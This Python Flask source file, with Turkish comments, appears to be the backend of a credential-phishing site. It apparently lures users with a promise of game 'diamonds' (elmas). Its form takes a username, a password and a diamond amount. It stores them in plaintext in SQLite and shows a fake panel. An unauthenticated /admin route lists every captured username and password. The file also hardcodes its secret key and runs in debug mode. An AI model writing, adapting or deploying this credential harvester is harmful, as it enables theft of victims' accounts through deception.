from flask import Flask, render_template, request, redirect, session
import sqlite3
from datetime import datetime

# -----------------------------------
# UYGULAMA AYARLARI
# -----------------------------------
app = Flask(__name__)
app.secret_key = "super-secret-key"

DB_PATH = "data.db"


# -----------------------------------
# VERİTABANI OLUŞTURMA
# -----------------------------------
def init_db():
    with sqlite3.connect(DB_PATH) as con:
        cur = con.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS kayitlar (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                kullaniciadi TEXT,
                sifre TEXT,
                elmas TEXT,
                tarih TEXT
            )
        """)
        con.commit()


# Uygulama başlarken tabloyu oluştur
init_db()


# -----------------------------------
# ANA SAYFA
# -----------------------------------
@app.route("/")
def index():
    return render_template("index.html")


# -----------------------------------
# FORM GÖNDERİLDİĞİNDE
# -----------------------------------
@app.route("/start", methods=["POST"])
def start():
    kullaniciadi = request.form.get("kullaniciadi", "").strip()
    sifre = request.form.get("sifre", "").strip()
    elmas = request.form.get("elmas", "").strip()

    # Tarih oluştur
    tarih = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Veritabanına kayıt
    with sqlite3.connect(DB_PATH) as con:
        cur = con.cursor()
        cur.execute(
            """
            INSERT INTO kayitlar (kullaniciadi, sifre, elmas, tarih)
            VALUES (?, ?, ?, ?)
            """,
            (kullaniciadi, sifre, elmas, tarih)
        )
        con.commit()

    # Session'a kullanıcıyı yaz
    session["kullaniciadi"] = kullaniciadi

    # Panel sayfasına yönlendir
    return redirect("/panel")


# -----------------------------------
# PANEL SAYFASI
# -----------------------------------
@app.route("/panel")
def panel():
    kullaniciadi = session.get("kullaniciadi")
    return render_template("panel.html", kullaniciadi=kullaniciadi)


# -----------------------------------
# ADMIN PANELİ
# -----------------------------------
@app.route("/admin")
def admin():
    with sqlite3.connect(DB_PATH) as con:
        cur = con.cursor()
        cur.execute("""
            SELECT id, kullaniciadi, sifre, elmas, tarih
            FROM kayitlar
            ORDER BY id DESC
        """)
        rows = cur.fetchall()

    return render_template("admin.html", rows=rows)


# -----------------------------------
# UYGULAMA BAŞLAT
# -----------------------------------
if __name__ == "__main__":
    app.run(debug=True)